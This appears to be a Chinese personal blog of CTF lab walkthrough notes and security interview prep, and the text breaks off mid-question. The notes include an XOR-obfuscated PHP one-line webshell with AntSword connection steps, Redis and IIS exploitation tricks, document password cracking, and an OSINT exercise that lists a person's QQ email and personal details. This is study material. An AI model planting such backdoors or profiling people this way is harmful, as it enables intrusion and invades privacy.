<h3 id="热点评论刷分漏洞分析溯源"><a href="#热点评论刷分漏洞分析溯源" class="headerlink" title="热点评论刷分漏洞分析溯源"></a>热点评论刷分漏洞分析溯源</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">too simple</span><br></pre></td></tr></table></figure>

<h3 id="来源页伪造"><a href="#来源页伪造" class="headerlink" title="来源页伪造"></a>来源页伪造</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">来源页 === 报文referer</span><br></pre></td></tr></table></figure>

<h1 id="主机安全"><a href="#主机安全" class="headerlink" title="主机安全"></a>主机安全</h1><h3 id="用户终端环境识别"><a href="#用户终端环境识别" class="headerlink" title="用户终端环境识别"></a>用户终端环境识别</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">抓包改</span><br><span class="line">useragent改成ipad</span><br><span class="line">accept-language:en,zh;q=0.9,zh-CN;q=0.8,en-GB;q=0.7,en-US;q=0.6，这里q是优先级</span><br><span class="line">cookie:分辨率在这里</span><br></pre></td></tr></table></figure>

<h3 id="WEB站点访问者身份识别"><a href="#WEB站点访问者身份识别" class="headerlink" title="WEB站点访问者身份识别"></a>WEB站点访问者身份识别</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip/robots.txt（注意有s）得知什么搜索引擎能用，然后去搜一个UA换一下</span><br></pre></td></tr></table></figure>

<h1 id="电子数据取证"><a href="#电子数据取证" class="headerlink" title="电子数据取证"></a>电子数据取证</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">关于linux日志文件的分析</span><br><span class="line">参考https://baijiahao.baidu.com/s?id=1722295394270641817&amp;wfr=spider&amp;for=pc</span><br></pre></td></tr></table></figure>

<h3 id="Linux硬盘文件分析取证-SSH过的IP"><a href="#Linux硬盘文件分析取证-SSH过的IP" class="headerlink" title="Linux硬盘文件分析取证(SSH过的IP)"></a>Linux硬盘文件分析取证(SSH过的IP)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//实训目标</span><br><span class="line">1、了解Linux备份方式；</span><br><span class="line">2、了解AccessData FTK Imager使用方法；</span><br><span class="line">3、掌握如何查看Linux日志；</span><br><span class="line"></span><br><span class="line">备份用dd工具</span><br><span class="line">参考https://blog.csdn.net/L592181260/article/details/110110771</span><br><span class="line">AccessData FTK Imager使用方法</span><br><span class="line">File-&gt;ADD Evidence Item-&gt;Image File导入img镜像</span><br><span class="line">Linux日志保存在/etc/log/messages</span><br><span class="line">检索sshd</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\墨者学院.assets\1654616455109.png" alt="1654616455109"></p>
<h3 id="Linux硬盘文件分析取证-新增用户"><a href="#Linux硬盘文件分析取证-新增用户" class="headerlink" title="Linux硬盘文件分析取证(新增用户)"></a>Linux硬盘文件分析取证(新增用户)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AccessData FTK Imager加载镜像打开/etc/password最下面就是了，或者查看/var/log/messages检索password for</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\墨者学院.assets\1654662366214.png" alt="1654662366214"></p>
<h3 id="日志文件分析溯源-Google蜘蛛"><a href="#日志文件分析溯源-Google蜘蛛" class="headerlink" title="日志文件分析溯源(Google蜘蛛)"></a>日志文件分析溯源(Google蜘蛛)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">检索googlebot，最前面是ip</span><br></pre></td></tr></table></figure>

<h3 id="远程电子数据取证-服务器分析-第1题"><a href="#远程电子数据取证-服务器分析-第1题" class="headerlink" title="远程电子数据取证-服务器分析(第1题)"></a>远程电子数据取证-服务器分析(第1题)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">win+R 	mstsc远程连接	这里要加上端口号</span><br><span class="line">在c盘搜索recycler即可</span><br><span class="line">关于recycler：实际被删除的文件保存在各自磁盘的recycler文件夹中，显示在回收站中</span><br></pre></td></tr></table></figure>

<h3 id="网络数据分析溯源-3389登录的IP地址"><a href="#网络数据分析溯源-3389登录的IP地址" class="headerlink" title="网络数据分析溯源(3389登录的IP地址)"></a>网络数据分析溯源(3389登录的IP地址)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用wireshark打开文件</span><br><span class="line">tcp.dstport==3389</span><br><span class="line">wireshark过滤命令参考https://blog.csdn.net/a56546/article/details/122208788?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0-122208788-blog-79342051.pc_relevant_antiscanv2&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=2</span><br></pre></td></tr></table></figure>

<h3 id="Docx文件分析溯源"><a href="#Docx文件分析溯源" class="headerlink" title="Docx文件分析溯源"></a>Docx文件分析溯源</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用Advanced Office Password Recovery爆破密码</span><br></pre></td></tr></table></figure>

<h3 id="Windows硬盘文件分析取证-连接过的FTP地址"><a href="#Windows硬盘文件分析取证-连接过的FTP地址" class="headerlink" title="Windows硬盘文件分析取证(连接过的FTP地址)"></a>Windows硬盘文件分析取证(连接过的FTP地址)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">参考https://blog.csdn.net/LRedAnt/article/details/103783239</span><br><span class="line">#挂载磁盘</span><br><span class="line">AccessData FTK Imager-&gt;file-&gt;image mounting-&gt;选择挂载文件，Mounting Method选择File System/Read Only		这一步挂载俺就成了一次lihua文件加一直没有访问权限</span><br><span class="line">新磁盘E盘搜素history，index.dat,检索ftp://得到ip</span><br></pre></td></tr></table></figure>

<h3 id="网络数据分析溯源-连接login-php的IP"><a href="#网络数据分析溯源-连接login-php的IP" class="headerlink" title="网络数据分析溯源(连接login.php的IP)"></a>网络数据分析溯源(连接login.php的IP)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wireshark打开</span><br><span class="line">过滤语句:		http contains &quot;login.php&quot;		这里是双引号！！</span><br></pre></td></tr></table></figure>

<h3 id="网络数据分析溯源-ping服务器的IP地址"><a href="#网络数据分析溯源-ping服务器的IP地址" class="headerlink" title="网络数据分析溯源(ping服务器的IP地址)"></a>网络数据分析溯源(ping服务器的IP地址)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping指令使用icmp协议</span><br><span class="line">过滤语句：	icmp</span><br></pre></td></tr></table></figure>

<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h3 id="PHP代码分析溯源-第1题"><a href="#PHP代码分析溯源-第1题" class="headerlink" title="PHP代码分析溯源(第1题)"></a>PHP代码分析溯源(第1题)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//	注：后缀php文件要在打开服务器后从浏览器看效果</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//	@在PHP中用作错误控制操作符。当表达式附加@符号时，将忽略该表达式可能生成的错误消息,如果启用了track_errors功能，则表达式生成的错误消息将保存在变量$php_errormsg中。每个错误都会覆盖此变量。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 	一句话后门中eval和assert的区别，参考https://blog.csdn.net/whatday/article/details/59168605</span></span><br><span class="line"><span class="comment">// 	eval参数是字符，assert参数是表达式或者函数</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	@<span class="variable">$_</span>++;</span><br><span class="line">	<span class="variable">$__</span>=(<span class="string">&quot;`&quot;</span>^<span class="string">&quot;?&quot;</span>).(<span class="string">&quot;:&quot;</span>^<span class="string">&quot;&#125;&quot;</span>).(<span class="string">&quot;%&quot;</span>^<span class="string">&quot;`&quot;</span>).(<span class="string">&quot;&#123;&quot;</span>^<span class="string">&quot;/&quot;</span>);</span><br><span class="line">	<span class="variable">$___</span>=(<span class="string">&quot;$&quot;</span>^<span class="string">&quot;&#123;&quot;</span>).(<span class="string">&quot;~&quot;</span>^<span class="string">&quot;.&quot;</span>).(<span class="string">&quot;/&quot;</span>^<span class="string">&quot;`&quot;</span>).(<span class="string">&quot;-&quot;</span>^<span class="string">&quot;~&quot;</span>).(<span class="string">&quot;(&quot;</span>^<span class="string">&quot;|&quot;</span>);</span><br><span class="line">	<span class="comment">// $&#123;$__&#125;[!$_]($&#123;$___&#125;[$_]); 	</span></span><br><span class="line">	<span class="comment">//$&#123;_GET&#125;[0]($&#123;_POST&#125;[1]);</span></span><br><span class="line">	<span class="comment">//$_GET[0]($_POST[1]);			本条为执行代码，不能打印？</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	(&quot;`&quot;^&quot;?&quot;)       	01100000^00111111=01011111—&gt;”_”</span></span><br><span class="line"><span class="comment">	(&quot;:&quot;^&quot;&#125;&quot;)        	00111010^01111101=01000111—&gt;”G”</span></span><br><span class="line"><span class="comment">	(&quot;%&quot;^&quot;`&quot;)      		00100101^01100000=01000101—&gt;”E”</span></span><br><span class="line"><span class="comment">	(&quot;&#123;&quot;^&quot;/&quot;)        	01111011^00101111=01010100—&gt;”T”</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$_</span>;			<span class="comment">#1       数值类型</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$__</span>;			<span class="comment">#_GET    字符类型</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$___</span>;			<span class="comment">#_POST   字符类型</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//	中国蚁剑连接	http://ip/b.php?0=assert 密码是1</span></span><br><span class="line"><span class="comment">//	!!!剑编码方式不能选默认</span></span><br></pre></td></tr></table></figure>

<h3 id="小学生加解密练习"><a href="#小学生加解密练习" class="headerlink" title="小学生加解密练习"></a>小学生加解密练习</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">too simple</span><br></pre></td></tr></table></figure>

<h3 id="密码学加解密实训-摩斯密码第1题"><a href="#密码学加解密实训-摩斯密码第1题" class="headerlink" title="密码学加解密实训(摩斯密码第1题)"></a>密码学加解密实训(摩斯密码第1题)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用winhex打开密文</span><br><span class="line">关于winhex这是一个可以用于磁盘回复的软件</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\墨者学院.assets\1654764056637.png" alt="1654764056637"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">发现它是wav文件，改后缀.wav</span><br><span class="line">后续参考https://blog.csdn.net/weixin_50698958/article/details/109060111</span><br></pre></td></tr></table></figure>

<h3 id="PHP代码分析溯源-第2题"><a href="#PHP代码分析溯源-第2题" class="headerlink" title="PHP代码分析溯源(第2题)"></a>PHP代码分析溯源(第2题)</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">参考https:<span class="operator">/</span><span class="operator">/</span>blog.csdn.net<span class="operator">/</span>weixin_39998158<span class="operator">/</span>article<span class="operator">/</span>details<span class="operator">/</span><span class="number">100547071</span></span><br><span class="line">因为php是弱类型语言，在使用<span class="operator">=</span><span class="operator">=</span>号时，如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\墨者学院.assets\1654876263894.png" alt="1654876263894"></p>
<h3 id="php分析溯源"><a href="#php分析溯源" class="headerlink" title="php分析溯源"></a>php分析溯源</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">too simple</span><br></pre></td></tr></table></figure>

<h1 id="安全意识"><a href="#安全意识" class="headerlink" title="安全意识"></a>安全意识</h1><h3 id="WEB页面分析"><a href="#WEB页面分析" class="headerlink" title="WEB页面分析"></a>WEB页面分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看源代码发现一个注释的a标签，猜一个url，这里是猜什么都行的</span><br></pre></td></tr></table></figure>

<h3 id="二维码文件分析"><a href="#二维码文件分析" class="headerlink" title="二维码文件分析"></a>二维码文件分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将靶场二维码下载到本地，找一个二维码在线解码，可以用https://cli.im/deqr，上传本地二维码进行解码，扫二维码后会得到一个链接，将链接https://www.baidu.com/ss?wd= 后面的内容通过base64两次解码，就会得到验证码，验证通过获取flag</span><br></pre></td></tr></table></figure>

<h3 id="互联网足迹探查"><a href="#互联网足迹探查" class="headerlink" title="互联网足迹探查"></a>互联网足迹探查</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">参考https://zhuanlan.zhihu.com/p/148433705</span><br><span class="line">添加好友得到有效信息:</span><br><span class="line">昵称WYH023S，男，35，1月19，重庆合川，邮箱1225307208@qq.com</span><br><span class="line">使用qq号和邮箱探查在哪些平台有活动痕迹</span><br><span class="line">利用搜索引擎探索有效信息，然后在微博上发现此人</span><br></pre></td></tr></table></figure>

<h3 id="PHP逻辑漏洞利用实战-第1题"><a href="#PHP逻辑漏洞利用实战-第1题" class="headerlink" title="PHP逻辑漏洞利用实战(第1题)"></a>PHP逻辑漏洞利用实战(第1题)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">感觉被骗了。。哪有这么出题的</span><br></pre></td></tr></table></figure>

<h1 id="CTFHUB"><a href="#CTFHUB" class="headerlink" title="CTFHUB"></a>CTFHUB</h1><h3 id="afr-2"><a href="#afr-2" class="headerlink" title="afr-2"></a>afr-2</h3><p><img src="C:\Users\hyy\Desktop\墨者学院.assets\1678113309924.png" alt="1678113309924"></p>
<h3 id="BUUCTF–-NESTCTF-2019-Love-Math-2"><a href="#BUUCTF–-NESTCTF-2019-Love-Math-2" class="headerlink" title="BUUCTF–[NESTCTF 2019]Love Math 2"></a>BUUCTF–[NESTCTF 2019]Love Math 2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_46263951/article/details/119240395</span><br></pre></td></tr></table></figure>

<h1 id="vulhubdocker"><a href="#vulhubdocker" class="headerlink" title="vulhub	docker"></a>vulhub	docker</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">weblogic 未授权命令执行漏洞		CVE-2020-14882</span><br><span class="line">weblogic ssrf				CVE</span><br><span class="line">https://blog.csdn.net/weixin_48739941/article/details/124330906</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/05/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/" data-id="cljpcwhtz0004l8ez2qeadxhq" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-面试准备" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/05/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/" class="article-date">
  <time class="dt-published" datetime="2023-07-05T06:46:12.473Z" itemprop="datePublished">2023-07-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="SSL-x2F-TLS"><a href="#SSL-x2F-TLS" class="headerlink" title="SSL&#x2F;TLS"></a>SSL&#x2F;TLS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SSL/TLS 协议位于网络 OSI 七层模型的会话层，用来加密通信。  </span><br><span class="line">**SSL**（Secure Sockets  Layer，安全套接字层）是一种**标准安全协议**，用于在在线通信中建立Web服务器和浏览器之间的加密链接。  </span><br><span class="line">SSL  通过互相认证、使用数字签名确保完整性、使用加密确保私密性，以实现客户端和服务器之间的安全通讯。  </span><br><span class="line">**TLS**（Transport Layer Security，传输层安全）是 IETF在SSL 3.0的基础上[设计](https://hd.nowcoder.com/link.html?target=https://www.isolves.com/it/rj/ps/)的协议，它是 SSL 协议的升级版。两者差别极小，可以理解为 TLS 是 SSL 3.1。</span><br></pre></td></tr></table></figure>

<h3 id="AES-x2F-BlowFish"><a href="#AES-x2F-BlowFish" class="headerlink" title="AES&#x2F;BlowFish"></a>AES&#x2F;BlowFish</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">AES：高级加密标准 是美国联邦*** 采用的一种区块加密标准。这个标准用来替代原先的DES，现今已然成为对称密钥加密中最流行的算法之一AES的区块长度固定为128 比特 ，密钥长度则可以是128，192或256比特</span><br><span class="line"></span><br><span class="line">BlowFish 使用了两个box,除了著名的S-box，还有一个p-box</span><br><span class="line">pbox有18个unsigned long元素</span><br><span class="line">sbox有4×256个unsigned long元素</span><br><span class="line">BlowFish算法中，有一个核心加密函数，该函数输入64位信息，运算后， 以64位密文的形式输出。 用BlowFish算法加密信息，需要两个过程。</span><br></pre></td></tr></table></figure>

<h3 id="特洛伊木马"><a href="#特洛伊木马" class="headerlink" title="特洛伊木马"></a>特洛伊木马</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">特洛伊木马(*** Horse)是指寄宿在计算机里的一种非授权的远程控制程序，这个名称来源于公元前十二世纪希腊和特洛伊之间的一场战争。由于特洛伊木马程序能够在计算机管理员未发觉的情况下开放系统权限、泄漏用户信息、甚至窃取整个计算机管理使用权限，使得它成为了黑客们最为常用的工具之一。</span><br></pre></td></tr></table></figure>

<h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FTP（File Transport Protocol），译为：文件传输协议， RFC 959定义了此规范，是基于TCP的应用层协议</span><br><span class="line">在RFC 1738中有定义， FTP的URL格式为： ftp://[user[:password]@]host[:port]/url-path</span><br><span class="line">FTP有2种连接模式：主动（Active）和被动（Passive）</span><br><span class="line">不管是哪种模式，都需要客户端和服务器建立2个连接</span><br><span class="line">① 控制连接：用于传输状态信息（命令， cmd）</span><br><span class="line">② 数据连接：用于传输文件和目录信息（data）</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Documents\面试准备.assets\1678453497585.png" alt="1678453497585"></p>
<h3 id="数据库延时注入"><a href="#数据库延时注入" class="headerlink" title="数据库延时注入"></a>数据库延时注入</h3><p><img src="C:\Users\hyy\Documents\面试准备.assets\1678454748080.png" alt="1678454748080"></p>
<h3 id="IIS6-0-PHP-lt-5-3-29"><a href="#IIS6-0-PHP-lt-5-3-29" class="headerlink" title="IIS6.0 PHP&lt;5.3.29"></a>IIS6.0 PHP&lt;5.3.29</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">IIS6.0 有以下文件解析漏洞：</span><br><span class="line">在文件夹为 asp, asa 内的所有文件都会被当成asp脚本进行解析;</span><br><span class="line">文件名如：xxx.asp;yyy.jpg 的文件，会忽略分号后面的后缀，将该文件当成asp脚本进行解析</span><br><span class="line">asa、cer、cdx 也会被当成asp脚本进行解析</span><br><span class="line"></span><br><span class="line">PHP&lt;5.3.29，且GPC关闭时，00截断是将上传文件名或路径名中使用ascll码值为0的字符（也就是null）来进行截断，%00一般用在URL中用于截断url来进行文件包含</span><br></pre></td></tr></table></figure>

<h3 id="utmp-wtmp"><a href="#utmp-wtmp" class="headerlink" title="utmp wtmp"></a>utmp wtmp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">	在Linux里，utmp 文件的绝对路径是 /var/run/utmp ，该文件通常用 who 命令来读取；wtmp 文件的绝对路径是 /var/log/wtmp ，该文件通常通过 last 命令来读取。这两个文件都不是普通的文本文件，所以不能用 cat ，less，more 等命令来查看。</span><br><span class="line"></span><br><span class="line">utmp日志文件记录有关当前登录的每个用户的信息。因此这个文件会随着用户登录和注销系统而不断变化，它只保留当时联机的用户记录，不会为用户保留永久的记录。系统中需要查询当前用户状态的程序，如 who、w、users、finger等就需要访问这个文件。该日志文件并不能包括所有精确的信息，因为某些突发错误会终止用户登录会话，而系统没有及时更新 utmp记录，因此该日志文件的记录不是百分之百值得信赖的。</span><br><span class="line"></span><br><span class="line">wtmp日志文件永久记录每个用户登录、注销及系统的启动、停机的事件。因此随着系统正常运行时间的增加，该文件的大小也会越来越大，增加的速度取决于系统用户登录的次数。该日志文件可以用来查看用户的登录记录，last命令就通过访问这个文件获得这些信息，并以反序从后向前显示用户的登录记录，last也能根据用户、终端tty或时间显示相应的记录。</span><br></pre></td></tr></table></figure>

<h3 id="nginx加固"><a href="#nginx加固" class="headerlink" title="nginx加固"></a>nginx加固</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">图片等静态资源目录不能给脚本执行权限</span><br><span class="line">禁止访问.git、.svn和.sql目录，可以防止因运维操作不当造成的代码或数据泄漏</span><br><span class="line">nginx的 master 进程 需要用 root 权限来启动，子进程则可以用其他用户来运行</span><br></pre></td></tr></table></figure>

<h3 id="SSL-Pinning"><a href="#SSL-Pinning" class="headerlink" title="SSL Pinning"></a>SSL Pinning</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">	SSL Pinning是一种防止中间人攻击（MITM）的技术，主要机制是在客户端发起请求–&gt;收到服务器发来的证书进行校验，如果收到的证书不被客户端信任，就直接断开连接不继续求情。	能防抓包修改参数</span><br><span class="line">	SSL PINING由于有证书校验，钓鱼站点不可能拥有真实站点的证书，故可以防止钓鱼攻击。</span><br><span class="line">	不能防水坑攻击</span><br><span class="line">“水坑攻击”，黑客攻击方式之一，顾名思义，是在受害者必经之路设置了一个“水坑(陷阱)”。最常见的做法是，黑客分析攻击目标的上网活动规律，寻找攻击目标经常访问的网站的弱点，先将此网站“攻破”并植入攻击代码，一旦攻击目标访问该网站就会“中招”。这种攻击是针对网站服务器的，在传输过程中的加密和认证无法防范这种攻击。</span><br></pre></td></tr></table></figure>

<h3 id="关于ddos的攻击方式"><a href="#关于ddos的攻击方式" class="headerlink" title="关于ddos的攻击方式"></a>关于ddos的攻击方式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CC攻击可以归为DDoS攻击的一种。他们之间的原理都是一样的，即发送大量的请求数据来导致服务器拒绝服务，是一种连接攻击。</span><br><span class="line">SYN Flood (SYN洪水) 是种典型的DoS (Denial of Service，拒绝服务) 攻击。效果就是服务器TCP连接资源耗尽，停止响应正常的TCP连接请求。</span><br><span class="line">NTP放大攻击是一种基于反射的体积分布式拒绝服务（DDoS）攻击，其中攻击者利用网络时间协议（NTP）服务器功能，以便用一定数量的UDP流量压倒目标网络或服务器，使常规流量无法访问目标及其周围的基础设施。</span><br><span class="line">“水坑攻击”，黑客攻击方式之一，顾名思义，是在受害者必经之路设置了一个“水坑(陷阱)”。最常见的做法是，黑客分析攻击目标的上网活动规律，寻找攻击目标经常访问的网站的弱点，先将此网站“攻破”并植入攻击代码，一旦攻击目标访问该网站就会“中招”</span><br></pre></td></tr></table></figure>



<h1 id="acmcoder"><a href="#acmcoder" class="headerlink" title="acmcoder"></a>acmcoder</h1><h4 id="小米2020"><a href="#小米2020" class="headerlink" title="小米2020"></a>小米2020</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">使用SQL命令将学生表STUDENT中的学生年龄AGE字段的值增加1岁</span><br><span class="line">	UPDATE STUDENT SET AGE＝AGE＋1</span><br><span class="line"></span><br><span class="line">android代码混淆个工具</span><br><span class="line">	proguard</span><br><span class="line">	</span><br><span class="line">获取随机数方案是较为安全</span><br><span class="line">	/dev/urandom</span><br><span class="line">	</span><br><span class="line">Java多线程中，请用下面哪种方式不会使线程进入阻塞状态</span><br><span class="line">	yield()</span><br><span class="line"></span><br><span class="line">Android APP常见的调试手段	abcd</span><br><span class="line">A、	xposed hook框架	</span><br><span class="line">B、	ida或smalidea动态调试	</span><br><span class="line">C、	重打包apk并设置AndroidManifest.xml的debuggable属性为true	</span><br><span class="line">D、	frida hook框架</span><br><span class="line"></span><br><span class="line">redis未授权的利用方法	abc</span><br><span class="line">A、	向crontab中写入计划任务	</span><br><span class="line">B、	写入ssh秘钥	</span><br><span class="line">C、	向web目录中写入webshell</span><br><span class="line"></span><br><span class="line">缓冲区溢出保护手段		NX STACK CANARY PIE</span><br><span class="line"></span><br><span class="line">Android四大组件包括Activity、Service、ContentProvider、Receiver</span><br><span class="line"></span><br><span class="line">在互联网信息基础设施中，可能影响全公司范围安全性的有	abcd</span><br><span class="line">A、	运维堡垒机	</span><br><span class="line">B、	配置管理系统	</span><br><span class="line">C、	服务编排系统	</span><br><span class="line">D、	CA系统</span><br><span class="line"></span><br><span class="line">为了通信安全，设备与云端采用 HTTPS 方式传输指令与数据，以下做法错误的是 abc</span><br><span class="line">A、	wget --no-check-certificate http://ota.mi.com/firmware.bin -O /tmp/xxx	</span><br><span class="line">B、	